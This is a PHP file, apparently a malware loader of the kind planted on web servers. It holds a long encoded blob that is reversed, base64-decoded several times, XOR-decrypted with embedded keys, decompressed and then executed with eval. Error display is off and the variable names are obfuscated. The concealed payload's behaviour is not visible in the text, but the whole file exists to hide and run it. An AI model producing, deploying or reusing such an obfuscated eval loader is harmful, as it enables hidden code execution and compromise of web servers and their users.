<?php

/* @A3rr0r */

error_reporting(E_ALL);
ini_set('display_errors', '0');
$ࠡ6aeࠥ1 = '==QcFJHbMl1YrUjbB9Gc3JjaodTZTJFZXBlVTF0cqR0dWhXdD9ke4kXOB1kRjlzShR0TuhzKkVkYX1mWjhjc2J0TyRGayoWQkhHOJVFaTFjVEREe1BlTkZ1c0ZXa4UGUPRUapVUZkl2T31EcWdFdZlEUth0LRFVV3ElQxY1YQx0QUlFcrYza0MndX52QqBFZsJDd3EnVNZESQBjN3Z3TItGZSt0VURGaplzMN5WW052NFRDSld3VNxkY2gGT2kDVrF2SwBjalBTZtJmQWlHO4VUQOFzcPNkWuZHdxdXevEmYB5UepRlZLpEOlVDWWNGMZlUcqtiUGFTcVZTSSZ1TYFlUkljW0BXS2NjSUlWa5pURsFDTroVc5c3RWhFV4w2LqhEeTRUZjlEbrkzbwk0LHJnSyI3N20WULZlQSpkN6F3Vh1GZEBzTwZHerMmbxlEbrVlV0RnS38WRutUc4lTTuZnR1ZDbSBTZ5EzcwV1VYl1NBpFW1YUTox0YtJ0QMplb6JVNJZTaMtGZyYDS3FncO5WaSR0KYRTQs9kS3k3NqRVRZJjMG9kTFhUOlFTVmhXaxlkMyRmM2AjSSFHdwNTUmdVVt5Ee1lzcvg3R3FkcmJkRGZWNZJFTGBjNvJ3U3JTbml0ZhJTTkhFdxkDdVVmSWJHVaREURFHc4M1QxYEV1ZGVjRGeaxmWZ90MCZmV4ckTGpGMMtiZ1VjME1WZ3h3bmhGVatURYd2b5tCNv1GZwx0SFhHSjVnZFpFV6xmSzM3MW9kW4IEanhTZyUkSIR3S5w2Unh3KQFEZXJnUPNEOrJ3YEp2KpVWZDZXOwoEMWBFc0VUbPhDUWNGTWFVMGRFSQNkUrwmWqtWRrUHOMNEcwhWRx8icxJFcSNDU4dUR48ERFFmSpFDVSJkV4AVRzgVc2skRKRFOzQGcxJlU0F2a4sibVlFNwkWW48UNR9GMuJ3c61EdSlUQLFjavlXenl3Ty9CSidFMUdEVlpHWrNDVUlVOFBle1J1K0lkZNljUlN3L5FFVOp1asNGZ5F2LqdWdSZVbERVTUNFbCFkUrQkeQ9CRWlkawEGVONTMGVDbh9yK0sUaYN2dolUYkFHb1o3Mh5WYww2ZqdUNQhjQwdUewl0aVpFb1pEe3hlN4xkQtlGVxZESP5WU0cFO3RjRWZ0TGdDVP5mSKV1cwZVbClHVvw0aRRlU1kGWklzKE9iRqdTODFTUU9EZ4wmUQJlNDd3b6FkUycEMPN1ZrJjdnVlUUV3SNVnZrUTNrZmWSJlWsJzLsFFS0JVM50kZ2sWSG1WWo5GVxhDZQpFcrdDUPREe3YnZLRzMtVVV3U3cHRHMidDOJRUUUVnQzgHOUtGZxkUWmR1Y';
$ࠡ95abࠥ2 = 'wtNLJGxXs/QpQeAMVuxt25wyEhszhy3mrOcSl34CN2Q=';
$ࠡc411ࠥ3 = 'XJKwrHqVxwR2x/csaKaFXdf/Rq8c+QTCxd+iCJj8t6U=';
$ࠡf487ࠥ4 = 'CXW9GmUKG/wndKGJduJ5IAguhabtABzJbo+PoGDa2xI=';
try {
$ࠡ52a6ࠥ5 = strrev($ࠡ6aeࠥ1);
$ࠡ52a6ࠥ5 = base64_decode($ࠡ52a6ࠥ5, true);
if ($ࠡ52a6ࠥ5 === false) throw new Exception('Decryption stage 2 failure.');
$ࠡ52a6ࠥ5 = base64_decode($ࠡ52a6ࠥ5, true);
if ($ࠡ52a6ࠥ5 === false) throw new Exception('Decryption stage 3 failure.');
$ࠡa4b9ࠥ6 = base64_decode($ࠡf487ࠥ4, true);
if ($ࠡa4b9ࠥ6 === false) throw new Exception('Key 3 decoding failure.');
$ࠡeb01ࠥ7 = '';
$ࠡ68cࠥ8 = strlen($ࠡ52a6ࠥ5);
for ($ࠡ2aa5ࠥ9 = 0; $ࠡ2aa5ࠥ9 < $ࠡ68cࠥ8; $ࠡ2aa5ࠥ9++) {
$ࠡeb01ࠥ7 .= chr(ord($ࠡ52a6ࠥ5[$ࠡ2aa5ࠥ9]) ^ ord($ࠡa4b9ࠥ6[$ࠡ2aa5ࠥ9 % 32]));
}
$ࠡ52a6ࠥ5 = $ࠡeb01ࠥ7;
$ࠡ52a6ࠥ5 = base64_decode($ࠡ52a6ࠥ5, true);
if ($ࠡ52a6ࠥ5 === false) throw new Exception('Decryption stage 5 failure.');
$ࠡc595ࠥ10 = base64_decode($ࠡ95abࠥ2, true);
$ࠡ942fࠥ11 = base64_decode($ࠡc411ࠥ3, true);
if ($ࠡc595ࠥ10 === false || $ࠡ942fࠥ11 === false) throw new Exception('Multi-keys decoding failure.');
$ࠡ4e34ࠥ12 = '';
$ࠡ68cࠥ8 = strlen($ࠡ52a6ࠥ5);
for ($ࠡ2aa5ࠥ9 = 0; $ࠡ2aa5ࠥ9 < $ࠡ68cࠥ8; $ࠡ2aa5ࠥ9++) {
$ࠡ4e34ࠥ12 .= chr(ord($ࠡ52a6ࠥ5[$ࠡ2aa5ࠥ9]) ^ ord($ࠡc595ࠥ10[$ࠡ2aa5ࠥ9 % 32]) ^ ord($ࠡ942fࠥ11[$ࠡ2aa5ࠥ9 % 32]));
}
$ࠡ52a6ࠥ5 = $ࠡ4e34ࠥ12;
$ࠡ52a6ࠥ5 = base64_decode($ࠡ52a6ࠥ5, true);
if ($ࠡ52a6ࠥ5 === false) throw new Exception('Decryption stage 7 failure.');
$ࠡ1c21ࠥ13 = gzinflate($ࠡ52a6ࠥ5);
if ($ࠡ1c21ࠥ13 === false) throw new Exception('Decompression failure.');
ob_start();
$ࠡe7acࠥ14 = eval('?>' . $ࠡ1c21ࠥ13);
if ($ࠡe7acࠥ14 === false && !empty($ࠡe5daࠥ15 = error_get_last())) {
}
ob_end_flush();
} catch (Exception $ࠡ668eࠥ16) {
header('HTTP/1.1 500 Internal Server Error');
echo '<div style="font-family:monospace;padding:20px;background:#1e1e1e;color:#ff5555;border-radius:5px;">';
echo '<h3>Execution Error</h3>';
echo '<p>' . htmlspecialchars($ࠡ668eࠥ16->getMessage()) . '</p>';
echo '</div>';
exit(1);
}
